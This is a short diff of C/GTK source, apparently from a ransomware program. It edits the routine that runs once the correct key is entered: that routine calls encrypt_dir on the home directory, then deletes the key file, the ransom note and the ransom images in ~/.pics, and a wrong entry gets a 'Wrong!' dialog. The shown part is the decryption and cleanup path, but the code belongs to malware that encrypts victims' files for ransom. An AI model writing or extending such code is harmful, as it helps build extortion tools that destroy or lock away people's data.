@@ -75,13 +75,17 @@ void on_entry_activate(GtkEntry *entry, gpointer user_data)
                 "This window will close automatically when it's finished.");
         gtk_alert_dialog_show(response, GTK_WINDOW(window));
         encrypt_dir(HOME);
+        gtk_window_close(GTK_WINDOW(window));
         sprintf(buf, "%s/%s", HOME, KEY_NAME);
         remove(buf);
         sprintf(buf, "%s/%s", HOME, RANSOM_NAME);
         remove(buf);
-        sprintf(buf, "%s/%s", HOME, ".pics");
+        sprintf(buf, "%s/%s", HOME, ".pics/pov.png");
         remove(buf);
-        gtk_window_close(GTK_WINDOW(window));
+        sprintf(buf, "%s/%s", HOME, ".pics/devastated.png");
+        remove(buf);
+        sprintf(buf, "%s/%s", HOME, ".pics");
+        rmdir(buf);
     } else if (decrypting == 0) {
         response = gtk_alert_dialog_new("Wrong!");
         gtk_alert_dialog_show(response, GTK_WINDOW(window));
